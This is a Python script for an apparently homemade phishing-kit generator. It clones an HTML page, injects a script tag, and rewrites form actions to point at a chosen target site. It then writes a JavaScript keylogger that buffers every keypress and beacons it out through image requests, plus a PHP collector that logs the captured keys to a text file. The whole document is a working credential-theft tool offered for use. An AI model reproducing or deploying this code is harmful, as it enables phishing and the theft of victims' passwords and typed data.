import os , sys , fileinput
###You can change the User Agent here###
UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
S10 = '\033[91m'#yellow
S11 = '\033[94m'#clearblue
S12 = '\033[93m'#pink

def draw():
    print(""" (                         )           """)
    print(""" )\ )   )               ( /(           """)
    print("""(()/(( /(    )    )     )\()) (  (     """)
    print(""" /(_))\())( /(   (    |((_)\ ))\ )\ )  """)
    print("""(_))((_)\ )(_))  )\  '|_ ((_)((_|()/(  """)
    print("""/ __| |(_|(_)_ _((_)) | |/ (_))  )(_)) """)
    print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
    print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
    print("""                                 |__/  """+S11)
target = input(S12+'Target page >  ')
def clear(numlines=100):
  print(S10)
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
    draw()
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
    draw()
  else:
    print('\n' * numlines)
    draw()

clear()
flu=input(S12+'Enter the .html file >  '+S10)
fle = "Phish/"+flu
clear()
print('\n\nCreating Phish directory\n\n'+S10+'Run 2 time if is the first time\n'+S11)
os.system('cp '+flu+' '+fle)


TxS= """</head>"""
TxR= """<script src="java.js"></script></head>"""
TxS1= """</HEAD>"""
TxR1= """<script src="java.js"></script></HEAD>"""
TxS2= 'action="/'
TxR2= ('action="'+target+'/')
TxS3= "action='/"
TxR3= ("action='"+target+'/')
clear()
input(S12+'continue for: '+TxS+S11)
clear()
TpF =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS in line :
        print(S10+'find: '+TxS)
        print(S12+'replaced: '+TxR+S11)
    else:
        print('find: nothing')
    TpF.write(line.replace(TxS,TxR))
TpF.close()

input(S12+'continue for: '+TxS1+S11)
clear()
TpF1 =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS1 in line :
        print(S10+'find: '+TxS1)
        print(S12+'replaced: '+TxR1+S11)
    else:
        print('find: nothing')
    TpF1.write(line.replace(TxS1,TxR1))
TpF1.close()

input(S12+'continue for: '+TxS2+S11)
clear()
TpF2 =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS2 in line :
        print(S10+'find: '+TxS2)
        print(S12+'replaced: '+TxR2+S11)
    else:
        print('find: nothing')
    TpF2.write(line.replace(TxS2,TxR2))
TpF2.close()

input(S12+'continue for: '+TxS3+S11)
clear()
TpF3 =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        print('find: nothing')
    TpF3.write(line.replace(TxS3,TxR3))
TpF3.close()

w = open("Phish/java.js", "w")
w.write("""
var buffer = [];
var attacker = 'get.php?c='
document.onkeypress = function(e) {
    buffer.push(e.key);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 10);
""")
w.close()
f = open("Phish/get.php", "w")
f.write("""
<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
""")
f.close()
